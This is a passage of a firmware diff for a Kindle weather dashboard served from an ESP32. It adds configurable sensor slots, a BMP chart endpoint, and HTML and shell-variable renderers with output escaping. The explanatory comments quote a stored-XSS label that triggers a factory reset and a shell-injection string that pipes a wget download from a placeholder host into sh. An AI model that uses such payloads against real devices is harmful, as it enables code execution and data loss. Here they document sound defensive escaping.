@@ -4,6 +4,9 @@
 
 #include <Arduino.h>
 #include <ESPAsyncWebServer.h>
+#include <time.h>
+#include <new>
+#include <memory>     // shared_ptr — the BMP filler owns its state through one
 #include <math.h>
 
 #include "../pipeline/DataPipeline.h"
@@ -13,6 +16,8 @@
 #include "DashboardStrings.h"
 #include "RefreshCadence.h"
 #include "KindleSkin.h"                 // config.kindle -> face, weight, formats
+#include "KindleChartBmp.h"             // ChartBmpCtx / ChartBmpReader
+#include "KindleSlotStore.h"            // the configurable slot list
 #ifdef FEATURE_ESPNOW_INGEST
 #  include "../espnow/EspNowIngest.h"   // espnowAnyBatteryWarn()
 #endif
@@ -25,6 +30,14 @@ static constexpr int PAGE_W  = KINDLE_PAGE_W;
 static constexpr int CHART_W = kdPx(560);
 static constexpr int CHART_H = kdPx(200);
 
+static const char* outdoorSensorId() {
+    return (config.kindle.outdoorSensor[0] != '\0') ? config.kindle.outdoorSensor : KINDLE_OUTDOOR_SENSOR;
+}
+
+static const char* indoorSensorId() {
+    return (config.kindle.indoorSensor[0] != '\0') ? config.kindle.indoorSensor : KINDLE_INDOOR_SENSOR;
+}
+
 // ---------------------------------------------------------------------------
 // Reading the current values
 // ---------------------------------------------------------------------------
@@ -32,6 +45,12 @@ struct Latest {
     float    value = NAN;
     uint32_t ts    = 0;
     bool     ok    = false;
+    // Carried from the reading rather than configured per slot. A metric's
+    // unit is a property of the sensor that produced it — an SDS011 knows its
+    // PM is µg/m³ and a BH1750 knows its light is lux — so asking the reader to
+    // type it into a slot would be asking them to repeat something the
+    // pipeline already knows, and to get it wrong.
+    char     unit[12] = {0};
 };
 
 static Latest latestOf(const char* sensorId, const char* metric) {
@@ -44,9 +63,17 @@ static Latest latestOf(const char* sensorId, const char* metric) {
         out.value = r.value;
         out.ts    = r.timestamp;
         out.ok    = true;
+        strncpy(out.unit, r.unit, sizeof(out.unit) - 1);
     }
     return out;
 }
+
+/// The reading a slot names, with the same humidity preference the fixed
+/// zones have always applied: a self-heating-corrected figure when the sensor
+/// publishes one. Routed through here rather than through latestOf() directly
+/// so a slot configured as plain "humidity" gets the corrected value, which is
+/// what the reader means and what the page used to show.
+static Latest slotReading(const KindleSlot& s);
 
 // The humidity to show, preferring the self-heating-corrected figure.
 //
@@ -64,6 +91,11 @@ static Latest humidityOf(const char* sensorId) {
     Latest corrected = latestOf(sensorId, "humidity_amb");
     if (corrected.ok) return corrected;
     return latestOf(sensorId, "humidity");
+}
+
+static Latest slotReading(const KindleSlot& s) {
+    if (strcmp(s.metric, "humidity") == 0) return humidityOf(s.sensorId);
+    return latestOf(s.sensorId, s.metric);
 }
 
 // ---------------------------------------------------------------------------
@@ -87,13 +119,6 @@ static void fmtInt(char* buf, size_t n, float v) {
     snprintf(buf, n, "%.0f", (double)v);
 }
 
-
-// A four-glyph reading needs a smaller face than a three-glyph one to sit in
-// the same column, and there is no JavaScript here to measure it after the
-// fact. Picking the class from the string length is the whole trick.
-static const char* bigClass(const char* v) {
-    return (strlen(v) >= 4) ? "big big4" : "big";
-}
 
 // ---------------------------------------------------------------------------
 // Barometric tendency
@@ -395,6 +420,32 @@ static void appendAge(String& out, uint32_t ts, uint32_t now) {
     else           { out += (mins / 60); out += F(KD_T(" h old", " ч")); }
 }
 
+// Text into HTML.
+//
+// EVERY STRING ON THIS PAGE USED TO BE A LITERAL. Slot labels are the first
+// that a person types, and they arrive through POST /api/kindle/slots, are
+// stored, and are rendered back on a page served without authentication — the
+// exact shape of a stored cross-site scripting bug. A label of
+// `<script>fetch('/api/factory_reset',{method:'POST'})</script>` would run in
+// the browser of whoever opened the dashboard.
+//
+// The reader itself is a 2014 browser that would probably not manage the
+// attack, but /kindle is reachable from any browser on the network, and "the
+// intended client is too old to be exploited" is not a security property.
+static void appendEscaped(String& out, const char* s) {
+    if (!s) return;
+    for (const char* q = s; *q; q++) {
+        switch (*q) {
+            case '&':  out += F("&amp;");  break;
+            case '<':  out += F("&lt;");   break;
+            case '>':  out += F("&gt;");   break;
+            case '"':  out += F("&quot;"); break;
+            case '\'': out += F("&#39;");  break;
+            default:   out += *q;          break;
+        }
+    }
+}
+
 
 // ---------------------------------------------------------------------------
 // Week strip
@@ -472,21 +523,801 @@ static void appendWeek(String& out, uint32_t now) {
 // on firmware 5.16.4 or later would support them; an older one would not, and
 // tables with literal pixel values render the same on both. See the header for
 // why that trade is made in favour of the old browser.
-static void handleKindle(AsyncWebServerRequest* req) {
-    const Latest outT = latestOf(KINDLE_OUTDOOR_SENSOR, "temperature");
-    const Latest outH = humidityOf(KINDLE_OUTDOOR_SENSOR);
-    const Latest outP = latestOf(KINDLE_OUTDOOR_SENSOR, "pressure");
-    const Latest inT  = latestOf(KINDLE_INDOOR_SENSOR,  "temperature");
-    const Latest inH  = humidityOf(KINDLE_INDOOR_SENSOR);
+// The chart itself lives in KindleChartBmp.h — Arduino-free, so the host
+// tests can render it and check the bytes. Only the serving is below.
 
+void handleKindleGraph(AsyncWebServerRequest* req) {
+    const KindleConfig skin = config.kindle;
+    const bool     hiRes = (skin.fbinkResW > 600);
+    const uint16_t W = hiRes ? 1000 : 560;
+    const uint16_t H = hiRes ? 360  : 200;
+
+    // A shared_ptr, AND THAT IS THE FIX, not a tidier spelling of the same
+    // thing. The previous version held raw pointers and deleted them only on
+    // the branch that runs when the last byte goes out, so a client that
+    // disconnected mid-image leaked the context and the stream state — every
+    // time. The client is a ten-year-old reader on wifi fetching this on a
+    // timer, which is the population most likely to drop a connection, and
+    // ~3 KB a go against this device's free heap is not many aborted requests
+    // before it stops serving anything at all. The response object owns the
+    // std::function; destroying it — on completion OR on abort — releases this.
+    auto st = std::shared_ptr<ChartBmpReader>(new(std::nothrow) ChartBmpReader);
+    if (!st) { req->send(503, "text/plain", "out of memory"); return; }
+
+    const uint32_t now = (uint32_t)time(nullptr);
+    st->ctx.haveOut = trendRing.series(outdoorSensorId(), "temperature", now, st->ctx.tOut);
+    st->ctx.haveIn  = trendRing.series(indoorSensorId(),  "temperature", now, st->ctx.tIn);
+    st->ctx.init(W, H);
+    st->begin();
+
+    // A LENGTHED RESPONSE, NOT A CHUNKED ONE. The size is known before the
+    // first byte, and the previous version sent it as Content-Length ON TOP OF
+    // Transfer-Encoding: chunked — two framings that contradict each other,
+    // where the length given was the unchunked size. A client that believed the
+    // header read a truncated BMP; a proxy is entitled to reject the message
+    // outright. Announcing the length also lets the reader show progress and
+    // skips the per-chunk framing on a slow link.
+    AsyncWebServerResponse* resp = req->beginResponse(
+        "image/bmp", st->total,
+        [st](uint8_t* buffer, size_t maxLen, size_t /*index*/) -> size_t {
+            return st->read(buffer, maxLen);
+        });
+
+    // beginResponse allocates, and this device runs close enough to its heap
+    // limit that "it returned null" is a real branch rather than a formality.
+    if (!resp) { req->send(503, "text/plain", "out of memory"); return; }
+    resp->addHeader("Cache-Control", "no-cache");
+    req->send(resp);
+}
+
+// ---------------------------------------------------------------------------
+// The page
+// ---------------------------------------------------------------------------
+
+
+// Emit one KEY="value" line with the value escaped for a POSIX shell.
+//
+// THE CONSUMER OF THIS FILE IS `.` — kindle/update_dash.sh sources it, as root,
+// on a device with no security model to speak of. So every byte on the right of
+// the `=` is code unless something makes it data, and one of the values is the
+// forecast provider's free-text summary: an upstream API's string, or anything
+// that can answer for it on an unencrypted link. A summary of
+//
+//     "; wget -O - http://x/y | sh; #
+//
+// is a shell command on the reader, not a weather description.
+//
+// Backslash-escaping the four characters that keep their meaning inside double
+// quotes ("  \  $  `) makes the value inert; control characters are dropped
+// outright because a newline would end the assignment whatever is escaped, and
+// none of them belong in a label.
+static void kdShellVar(AsyncResponseStream* s, const char* key, const char* val) {
+    s->print(key);
+    s->print("=\"");
+    for (const char* p = val; p && *p; p++) {
+        const unsigned char c = (unsigned char)*p;
+        if (c < 0x20 || c == 0x7F) continue;
+        if (c == '"' || c == '\\' || c == '$' || c == '`') s->print('\\');
+        s->write(c);
+    }
+    s->print("\"\n");
+}
+
+/// The same, for the indexed keys (FC0_LABEL, WK3_NAME…).
+static void kdShellVarN(AsyncResponseStream* s, const char* fmt, int i, const char* val) {
+    char key[24];
+    snprintf(key, sizeof(key), fmt, i);
+    kdShellVar(s, key, val);
+}
+
+// ---------------------------------------------------------------------------
+// The eleven places
+// ---------------------------------------------------------------------------
+/// One resolved place: the reading, formatted, with the label, unit and
+/// tendency it will be drawn with. Shared by both renderers so a value cannot
+/// be rounded one way on the reader and another in a browser.
+struct KdResolved {
+    char        text[24];   ///< the number, already at its decimals
+
+    /// A BUFFER, NOT A POINTER, and that is the whole point of it.
+    ///
+    /// The unit usually comes from KD_METRIC_STYLE and is a string literal, but
+    /// for a metric the table does not list — or lists with a null unit, which
+    /// is wind, wind_speed, uva, uvb and flow_rate — kdSlotUnit() hands back the
+    /// unit the SENSOR reported, and that lives in the `Latest` the resolve loop
+    /// declared for one iteration. Storing the pointer meant both renderers read
+    /// a popped stack frame: the reading would print with whatever happened to
+    /// be at that address, which on a good day is the next place's unit.
+    char        unit[12];   ///< sized to match Latest::unit
+
+    const char* label;      ///< into KindleZones or a table literal — both outlive us
+    const char* arrow;      ///< a literal from ARROWS[]
+    bool        ok;
+    uint32_t    ts;
+};
+
+/// How wide a string comes out, in THOUSANDTHS OF THE TYPE SIZE.
+///
+/// For the shell renderer, which draws with FBInk and cannot ask it how wide it
+/// drew something. The headline sets two values and a slash on one baseline, so
+/// the second one's x depends on the first one's width, and a script counting
+/// characters would be wrong twice over: `${#var}` counts bytes, so "8.4°" is
+/// five of them, and a digit and a full stop are not the same width anyway.
+///
+/// The weights are for a serif at a glance size — Bookerly, Caecilia, Georgia,
+/// which is the stack this page names. Figures are tabular in all three, hence
+/// one width for all ten. Being a few per cent out moves the slash by a pixel
+/// or two, which is why an estimate is good enough here and would not be for
+/// anything that had to line up.
+static unsigned kdAdvanceMille(const char* s) {
+    if (!s) return 0;
+    unsigned total = 0;
+    for (const unsigned char* q = (const unsigned char*)s; *q; q++) {
+        if ((*q & 0xC0) == 0x80) continue;          // a UTF-8 continuation byte
+        unsigned w;
+        if (*q == 0xC2) {
+            // The two Latin-1 supplement glyphs this page actually prints.
+            const unsigned char n = q[1];
+            w = (n == 0xB0) ? 330u :                // ° — narrow
+                (n == 0xB5) ? 520u : 550u;          // µ
+        }
+        else if (*q >= 0xC0)                 w = 620;   // a letter outside ASCII
+        else if (*q >= '0' && *q <= '9')     w = 500;   // tabular figures
+        else if (*q == '.' || *q == ',' ||
+                 *q == ':' || *q == '\'')    w = 260;
+        else if (*q == '-' || *q == '+' ||
+                 *q == '/')                  w = 330;
+        else if (*q == ' ')                  w = 250;
+        else if (*q == '%')                  w = 800;
+        else if (*q >= 'A' && *q <= 'Z')     w = 620;
+        else if (*q >= 'a' && *q <= 'z')     w = 500;
+        else                                 w = 550;
+        total += w;
+    }
+    return total;
+}
+
+/// Resolve all eleven places against the live readings.
+///
+/// ONE CALL, USED BY BOTH RENDERERS. The FBInk page and the HTML one differ in
+/// how they DRAW a place and not at all in what is in it, so the visibility
+/// rule, the unit conversion, the rounding and the tendency happen here once.
+/// Two copies of this would be two chances to show a different number depending
+/// on which screen you were looking at.
+static void kdResolveZones(const KindleConfig& skin, KdResolved out[KZ_COUNT]) {
+    const KindleZones& zones = kdSlots();
+    static const char* ARROWS[] = { "↑", "↗", "→", "↘", "↓" };
+
+    for (int i = 0; i < KZ_COUNT; i++) {
+        out[i] = KdResolved{};      // zeroes unit[], which is an empty string
+        out[i].label = "";
+        out[i].arrow = "";
+
+        const KindleSlot& sl = zones.z[i];
+        if (!sl.used()) continue;
+
+        const Latest rd = slotReading(sl);
+        if (!rd.ok) continue;
+
+        float       v    = rd.value;
+        const char* unit = rd.unit;
+        int         dec  = kdSlotDecimals(sl);
+
+        // Pressure is the one metric the reader can re-unit, so it is the one
+        // whose stored hPa is not what gets printed.
+        if (strcmp(sl.metric, "pressure") == 0) {
+            v    = kdPressureValue(rd.value, skin.pressureUnit);
+            unit = kdPressureUnitLabel(skin.pressureUnit);
+            dec  = kdPressureDecimals(skin.pressureUnit);
+        } else if (strcmp(sl.metric, "temperature") == 0) {
+            // The temperature decimals control predates the places and still
+            // wins: it is the setting people actually turn, and having it apply
+            // to the headline but not to a second temperature would be a
+            // puzzle.
+            dec = skin.tempDecimals;
+        }
+
+        snprintf(out[i].text, sizeof(out[i].text), "%.*f", dec, (double)v);
+        // The display unit, which is not always the sensor's: a temperature
+        // wants the degree sign the page has always shown, not the pipeline's
+        // machine-readable "C". Pressure is the exception — it was re-united
+        // above and carries its own label.
+        if (strcmp(sl.metric, "pressure") != 0) unit = kdSlotUnit(sl, unit);
+        if ((sl.flags & KSLOTF_UNIT) && unit) {
+            strncpy(out[i].unit, unit, sizeof(out[i].unit) - 1);
+            out[i].unit[sizeof(out[i].unit) - 1] = '\0';
+        }
+        out[i].label = kdSlotLabel(sl);
+        out[i].ok    = true;
+        out[i].ts    = rd.ts;
+
+        // The three-hour tendency, for the place that asked for one. Pressure
+        // is the only metric it is defined for — a rising AQI is a number going
+        // up, a rising barometer is a forecast — so the flag is quietly ignored
+        // elsewhere rather than drawing an arrow that means nothing.
+        if ((sl.flags & KSLOTF_TREND) && (skin.showFlags & KSHOW_TENDENCY) &&
+            strcmp(sl.metric, "pressure") == 0) {
+            TrendRing::Hour h[TrendRing::HOURS];
+            if (trendRing.series(sl.sensorId, "pressure",
+                                 (uint32_t)time(nullptr), h)) {
+                const Tendency t = pressureTendency(h);
+                if (t.have) {
+                    int ai = 2;
+                    if      (t.delta >=  1.6f) ai = 0;
+                    else if (t.delta >=  0.5f) ai = 1;
+                    else if (t.delta >  -0.5f) ai = 2;
+                    else if (t.delta >  -1.6f) ai = 3;
+                    else                       ai = 4;
+                    out[i].arrow = ARROWS[ai];
+                }
+            }
+        }
+    }
+}
+
+/// Which places have something to draw — the input to the closing-up rules.
+static void kdZoneVisibility(const KdResolved* res, bool visible[KZ_COUNT]) {
+    for (int i = 0; i < KZ_COUNT; i++) visible[i] = res[i].ok;
+}
+
+/// The line under the headline: the hero metric's 24-hour low-to-high, and how
+/// old its reading is.
+///
+/// Built here rather than in each renderer because it is one sentence in the
+/// page's language, and two renderers composing it separately is two places for
+/// the wording, the unit and the rounding to drift apart.
+static void kdSubLine(char* buf, size_t n, const KindleConfig& skin,
+                      const KdResolved& hero, uint32_t now) {
+    buf[0] = '\0';
+    const KindleZones& zones = kdSlots();
+    const KindleSlot&  sl    = zones.z[KZ_HERO];
+    size_t at = 0;
+
+    if ((skin.showFlags & KSHOW_RANGE) && sl.used()) {
+        TrendRing::Hour h[TrendRing::HOURS];
+        float mn, mx;
+        if (trendRing.series(sl.sensorId, sl.metric, now, h) &&
+            windowExtremes(h, mn, mx)) {
+            const int dec = (strcmp(sl.metric, "temperature") == 0)
+                          ? skin.tempDecimals : kdSlotDecimals(sl);
+            at += snprintf(buf + at, n - at, "%.*f %s %.*f%s",
+                           dec, (double)mn, KD_T("to", "до"),
+                           dec, (double)mx, hero.unit ? hero.unit : "");
+            if (at >= n) { buf[n - 1] = '\0'; return; }
+        }
+    }
+
+    // The age, and only when it is worth saying. A reading a minute old is
+    // current; one an hour old is the thing the reader needs to know about.
+    if ((sl.flags & KSLOTF_AGE) && hero.ok && hero.ts && now > hero.ts) {
+        const uint32_t mins = (now - hero.ts) / 60u;
+        if (mins >= 2) {
+            const char* sep = at ? "  ·  " : "";
+            if (mins < 60)
+                snprintf(buf + at, n - at, "%s%u%s", sep, (unsigned)mins,
+                         KD_T(" min old", " мин"));
+            else
+                snprintf(buf + at, n - at, "%s%u%s", sep, (unsigned)(mins / 60),
+                         KD_T(" h old", " ч"));
+        }
+    }
+    buf[n - 1] = '\0';
+}
+
+// ---------------------------------------------------------------------------
+// The shell renderer's half
+// ---------------------------------------------------------------------------
+/// Emit the eleven places for update_dash.sh.
+///
+/// The keys are named after the places rather than numbered, so the script says
+/// `$Z_HERO_VALUE` and a person reading it knows where that lands. GRID_ZONES
+/// and IN_ZONES carry the closing-up: they list only the places that survived,
+/// in order, so the script iterates a list instead of re-deriving the rule.
+static void emitZones(AsyncResponseStream* s, const KindleConfig& skin, uint32_t now) {
+    KdResolved res[KZ_COUNT];
+    kdResolveZones(skin, res);
+
+    bool visible[KZ_COUNT];
+    kdZoneVisibility(res, visible);
+
+    const KindleZones& zones = kdSlots();
+
+    kdShellVar(s, "Z_GROUP_OUT", kdGroupOutLabel(zones));
+    kdShellVar(s, "Z_GROUP_IN",  kdGroupInLabel(zones));
+
+    char sub[64];
+    kdSubLine(sub, sizeof(sub), skin, res[KZ_HERO], now);
+    kdShellVar(s, "Z_SUB", sub);
+
+    char key[24];
+    for (int i = 0; i < KZ_COUNT; i++) {
+        // Upper case, because the shell reads these as variable names and the
+        // rest of the protocol is upper case.
+        const char* k = kdZoneKey((uint8_t)i);
+        char up[8];
+        size_t j = 0;
+        for (; k[j] && j < sizeof(up) - 1; j++)
+            up[j] = (k[j] >= 'a' && k[j] <= 'z') ? (char)(k[j] - 32) : k[j];
+        up[j] = '\0';
+
+        snprintf(key, sizeof(key), "Z_%s_VALUE", up);
+        kdShellVar(s, key, res[i].ok ? res[i].text : "");
+        snprintf(key, sizeof(key), "Z_%s_UNIT", up);
+        kdShellVar(s, key, res[i].unit);
+        snprintf(key, sizeof(key), "Z_%s_LABEL", up);
+        kdShellVar(s, key, res[i].label);
+        snprintf(key, sizeof(key), "Z_%s_ARROW", up);
+        kdShellVar(s, key, res[i].arrow);
+
+        s->printf("Z_%s_BOLD=%d\n", up,
+                  (zones.z[i].flags & KSLOTF_BOLD) ? 1 : 0);
+        // The colour NAME, not the level: the shell hands it straight to
+        // FBInk's -C, and translating a number there would be a second copy of
+        // a mapping that already lives in KindleSlots.h.
+        snprintf(key, sizeof(key), "Z_%s_INK", up);
+        kdShellVar(s, key, kdInkFbink(zones.z[i].ink));
+
+        // HOW WIDE THE PIECES COME OUT, in thousandths of the type size they
+        // are drawn at. The shell renderer needs them because a unit is set as
+        // a footnote at four tenths of its number and a tendency arrow after
+        // that, and FBInk draws one size per call — so each piece is a separate
+        // draw at an x that depends on the width of the one before it, and
+        // FBInk will not say what that width was.
+        s->printf("Z_%s_VADVW=%u\n", up, kdAdvanceMille(res[i].text));
+        s->printf("Z_%s_UADVW=%u\n", up, kdAdvanceMille(res[i].unit));
+
+        // The headline needs one more: the whole of it, unit included, because
+        // the slash and the second value go after all of it rather than after
+        // the number alone.
+        if (i == KZ_HERO) {
+            char whole[40];
+            snprintf(whole, sizeof(whole), "%s%s", res[i].text, res[i].unit);
+            s->printf("Z_HERO_ADVW=%u\n", kdAdvanceMille(whole));
+        }
+    }
+
+    // The survivors, in order. An empty list is a group that draws nothing.
+    uint8_t used[KZ_GRID_COUNT];
+    const int n = (skin.showFlags & KSHOW_GRID)
+                ? kdGridUsed(zones, visible, used) : 0;
+    s->print("GRID_ZONES=\"");
+    for (int i = 0; i < n; i++) {
+        if (i) s->print(' ');
+        for (const char* c = kdZoneKey(used[i]); *c; c++)
+            s->print((char)((*c >= 'a' && *c <= 'z') ? *c - 32 : *c));
+    }
+    s->print("\"\n");
+
+    // How they break into rows. Worked out here rather than in the script for
+    // the reason the packing always was: the HTML page and the reader must not
+    // disagree about which cell is on which row, and a balancing rule written
+    // twice is a rule written differently.
+    int rows[KZ_GRID_COUNT];
+    const int nRows = kdGridRowSplit(n, rows, KZ_GRID_COUNT);
+    s->print("GRID_ROWS=\"");
+    for (int r = 0; r < nRows; r++) {
+        if (r) s->print(' ');
+        s->print(rows[r]);
+    }
+    s->print("\"\n");
+
+    uint8_t inUsed[KZ_INDOOR_COUNT];
+    const int inN = (skin.showFlags & KSHOW_INSIDE)
+                  ? kdIndoorUsed(zones, visible, inUsed) : 0;
+    s->print("IN_ZONES=\"");
+    for (int i = 0; i < inN; i++) {
+        if (i) s->print(' ');
+        for (const char* c = kdZoneKey(inUsed[i]); *c; c++)
+            s->print((char)((*c >= 'a' && *c <= 'z') ? *c - 32 : *c));
+    }
+    s->print("\"\n");
+}
+
+// ---------------------------------------------------------------------------
+// The HTML renderer's half
+// ---------------------------------------------------------------------------
+/// One value with its unit and, if it has one, its tendency arrow.
+static void appendValue(String& p, const KdResolved& r, const KindleSlot& sl,
+                        const char* cls) {
+    p += F("<span class=\"");
+    p += cls;
+    if (sl.flags & KSLOTF_BOLD) p += F(" val-b");
+    // How dark, per place. Black is the default and emits no class, so a page
+    // where nobody has touched this carries no extra markup at all.
+    if (sl.ink == KINK_DARK)       p += F(" ink-d");
+    else if (sl.ink == KINK_MID)   p += F(" ink-m");
+    else if (sl.ink == KINK_LIGHT) p += F(" ink-l");
+    p += F("\">");
+    if (!r.ok) {
+        p += F("<span class=\"dim\">&mdash;</span></span>");
+        return;
+    }
+    p += r.text;
+    if (r.unit && *r.unit) {
+        // TWO UNITS SET TIGHT AGAINST THE NUMBER, and the rest with a space
+        // before them. "8.4 °" and "71 %" are not how either is written;
+        // "1008 hPa" is. The degree also rides high rather than sitting on the
+        // baseline, where at a third of the value's size it reads as a
+        // lower-case o.
+        const bool deg   = strcmp(r.unit, "°") == 0;
+        const bool tight = deg || strcmp(r.unit, "%") == 0;
+        p += F("<span class=\"unit");
+        if (deg) p += F(" unit-d");
+        p += F("\">");
+        if (!tight) p += ' ';
+        appendEscaped(p, r.unit);
+        p += F("</span>");
+    }
+    if (r.arrow && *r.arrow) {
+        p += F("<span class=\"tend\">");
+        p += r.arrow;
+        p += F("</span>");
+    }
+    p += F("</span>");
+}
+
+/// A captioned cell: the label above, the value under it. The grid and the
+/// indoor row are the same shape at two sizes, so they are one function.
+static void appendCell(String& p, const KdResolved& r, const KindleSlot& sl,
+                       const char* valueClass, bool caption = true) {
+    if (caption) {
+        p += F("<div class=\"lab\">");
+        appendEscaped(p, r.ok ? r.label : kdSlotLabel(sl));
+        p += F("</div>");
+    }
+    p += F("<div class=\"cv\">");
+    appendValue(p, r, sl, valueClass);
+    p += F("</div>");
+}
+
+/// The whole top of the page: the outdoor headline and grid on the left, the
+/// clock and the indoor row on the right.
+static void appendTopBlock(String& p, const KindleConfig& skin, uint32_t now) {
+    KdResolved res[KZ_COUNT];
+    kdResolveZones(skin, res);
+
+    bool visible[KZ_COUNT];
+    kdZoneVisibility(res, visible);
+
+    const KindleZones& zones = kdSlots();
+
+    // A TABLE, not a grid or flexbox. The reader is a browser from 2014 with no
+    // CSS Grid and a flexbox implementation that is not worth finding the edges
+    // of; the rest of this page is tables for the same reason.
+    p += F("<table class=\"top\"><tr><td class=\"col-l\" width=\"50%\">");
+
+    // ── The outdoor headline ────────────────────────────────────────────────
+    p += F("<div class=\"lab\">");
+    appendEscaped(p, kdGroupOutLabel(zones));
+    // The battery badge warns about the node feeding this page, so it belongs
+    // on this heading — where it has always been.
+    if ((skin.showFlags & KSHOW_BATTERY) && batteryWarningActive())
+        appendBatteryBadge(p);
+    p += F("</div><div class=\"head\">");
+
+    appendValue(p, res[KZ_HERO], zones.z[KZ_HERO], "v1");
+    if ((skin.showFlags & KSHOW_BIG) && zones.z[KZ_BIG].used() && res[KZ_BIG].ok) {
+        p += F("<span class=\"slash\">/</span>");
+        appendValue(p, res[KZ_BIG], zones.z[KZ_BIG], "v2");
+    }
+    p += F("</div>");
+
+    char sub[64];
+    kdSubLine(sub, sizeof(sub), skin, res[KZ_HERO], now);
+    if (sub[0]) {
+        p += F("<div class=\"sub\">");
+        appendEscaped(p, sub);
+        p += F("</div>");
+    }
+
+    // ── The two-by-two grid ─────────────────────────────────────────────────
+    // Two columns always, so the second cell of a row lands under the second
+    // cell of the row above it. A single survivor takes the left half and
+    // leaves the right one empty rather than stretching across both: a value
+    // twice as wide as the one under it is a worse answer than white space.
+    if (skin.showFlags & KSHOW_GRID) {
+        uint8_t used[KZ_GRID_COUNT];
+        const int n = kdGridUsed(zones, visible, used);
+
+        int rows[KZ_GRID_COUNT];
+        const int nRows = kdGridRowSplit(n, rows, KZ_GRID_COUNT);
+
+        int at = 0;
+        for (int r = 0; r < nRows; r++) {
+            const int cols = rows[r];
+            // EACH ROW DIVIDES ITS OWN WIDTH BY ITS OWN COUNT. Two cells are
+            // two halves, not two of three thirds with the last one white —
+            // "no empty space" has to hold whichever places got filled in.
+            p += F("<table class=\"grid");
+            if (cols >= 3) p += F(" grid-3");    // the tighter type scale
+            p += F("\"><tr>");
+            for (int c = 0; c < cols && at < n; c++, at++) {
+                p += F("<td width=\"");
+                p += (int)(100 / cols);
+                p += F("%\">");
+                appendCell(p, res[used[at]], zones.z[used[at]], "gv");
+                p += F("</td>");
+            }
+            p += F("</tr></table>");
+        }
+    }
+
+    p += F("</td><td class=\"col-r sep\" width=\"50%\">");
+
+    // ── The clock ───────────────────────────────────────────────────────────
+    // Not a reading and so not a place, but it is what the right column is for.
+    // An e-ink panel on a shelf is read across a room, which is why the time is
+    // set at 96 px here and not as the 14 px of grey in a corner it started as.
+    if (now > 1000000000u) {
+        const time_t when_t = (time_t)now;
+        struct tm tmv;
+        if (localtime_r(&when_t, &tmv) != nullptr) {
+            char hm[12];
+            kdFmtTime(hm, sizeof(hm), tmv, skin.timeFormat);
+            p += F("<div class=\"clock\">"); p += hm; p += F("</div>");
+            // The one clock style that needs markup as well as a rule.
+            if (skin.clockStyle == KCLOCK_DATED) {
+                char dt[32];
+                kdFmtDate(dt, sizeof(dt), tmv, skin.dateFormat);
+                p += F("<div class=\"clock-d\">"); p += dt; p += F("</div>");
+            }
+        } else {
+            p += F("<div class=\"clock-x\">" KD_T("no time", "няма час") "</div>");
+        }
+    } else {
+        // Not "--:--": a plausible-looking blank clock invites the reader to
+        // wonder what time it is, where "clock not set" names the fault.
+        p += F("<div class=\"clock-x\">" KD_T("clock not set", "часът не е сверен") "</div>");
+    }
+
+    // ── The indoor row ──────────────────────────────────────────────────────
+    // Three places or two, whichever is configured and reporting, on one row
+    // with the first set larger. Equal columns, so two fields are two halves
+    // and three are three thirds — and the first is bigger by TYPE, not by
+    // width, which is what keeps the row aligned whichever count it is.
+    if (skin.showFlags & KSHOW_INSIDE) {
+        uint8_t used[KZ_INDOOR_COUNT];
+        const int n = kdIndoorUsed(zones, visible, used);
+        if (n > 0) {
+            p += F("<div class=\"inrule\"></div><div class=\"lab\">");
+            appendEscaped(p, kdGroupInLabel(zones));
+            p += F("</div><table class=\"inrow\"><tr>");
+            // THE FIRST FIELD GETS MORE OF THE ROW, not an equal share. It is
+            // set larger, so equal columns crowd it against its neighbour while
+            // leaving the small ones with space they do not need — "21.0°" at
+            // forty pixels does not fit a third of half a page.
+            const int firstW = (n >= 3) ? 42 : (n == 2 ? 58 : 100);
+            for (int i = 0; i < n; i++) {
+                p += F("<td width=\"");
+                p += (i == 0) ? firstW : ((100 - firstW) / (n - 1));
+                p += F("%\">");
+                // THE FIRST FIELD CARRIES NO CAPTION and spends the line on
+                // type instead. The heading directly above it already says
+                // which room this is, and "TEMP" under it says nothing a
+                // degree sign has not already said. The other two keep theirs
+                // and sit on the bottom of the row, so all three values line
+                // up along one edge rather than along their tops.
+                appendCell(p, res[used[i]], zones.z[used[i]],
+                           i == 0 ? "iv iv-1" : "iv", i != 0);
+                p += F("</td>");
+            }
+            p += F("</tr></table>");
+        }
+    }
+
+    p += F("</td></tr></table>");
+}
+
+static void handleKindleData(AsyncWebServerRequest* req) {
+    const Latest outT = latestOf(outdoorSensorId(), "temperature");
+    const Latest outH = humidityOf(outdoorSensorId());
+    const Latest outP = latestOf(outdoorSensorId(), "pressure");
+    const Latest inT  = latestOf(indoorSensorId(),  "temperature");
+    const Latest inH  = humidityOf(indoorSensorId());
+    const Latest inA  = latestOf(indoorSensorId(),  "aqi");
     const uint32_t now = (uint32_t)time(nullptr);
 
     TrendRing::Hour tOut[TrendRing::HOURS];
     TrendRing::Hour tIn [TrendRing::HOURS];
     TrendRing::Hour tPress[TrendRing::HOURS];
-    const bool haveOut = trendRing.series(KINDLE_OUTDOOR_SENSOR, "temperature", now, tOut);
-    const bool haveIn  = trendRing.series(KINDLE_INDOOR_SENSOR,  "temperature", now, tIn);
-    const bool haveP   = trendRing.series(KINDLE_OUTDOOR_SENSOR, "pressure",    now, tPress);
+    const bool haveOut = trendRing.series(outdoorSensorId(), "temperature", now, tOut);
+    const bool haveIn  = trendRing.series(indoorSensorId(),  "temperature", now, tIn);
+    const bool haveP   = trendRing.series(outdoorSensorId(), "pressure",    now, tPress);
+
+    KindleConfig skin = config.kindle;
+    kdSkinClamp(skin);
+    char buf[24];
+
+    AsyncResponseStream* s = req->beginResponseStream("text/plain");
+
+    // ── Outdoor ──
+    fmtTemp(buf, sizeof(buf), outT.value, skin.tempDecimals);
+    kdShellVar(s, "OUT_TEMP", outT.ok ? buf : "--");
+    s->printf("OUT_HUM=%d\n", outH.ok ? (int)roundf(outH.value) : -1);
+    
+    if (outP.ok) {
+        const float pv = kdPressureValue(outP.value, skin.pressureUnit);
+        const int pd = kdPressureDecimals(skin.pressureUnit);
+        if (pd) snprintf(buf, sizeof(buf), "%.*f", pd, (double)pv);
+        else    fmtInt(buf, sizeof(buf), pv);
+        kdShellVar(s, "OUT_PRES", buf);
+        kdShellVar(s, "OUT_PRES_UNIT", kdPressureUnitLabel(skin.pressureUnit));
+    } else {
+        s->print("OUT_PRES=\"--\"\nOUT_PRES_UNIT=\"\"\n");
+    }
+
+    if (haveP) {
+        const Tendency t = pressureTendency(tPress);
+        if (t.have) {
+            kdShellVar(s, "OUT_TEND", t.word);
+            const char* arrows[] = {"↑", "↗", "→", "↘", "↓"};
+            int ai = 2; // steady default
+            if (t.delta >= 1.6f) ai = 0;
+            else if (t.delta >= 0.5f) ai = 1;
+            else if (t.delta > -0.5f) ai = 2;
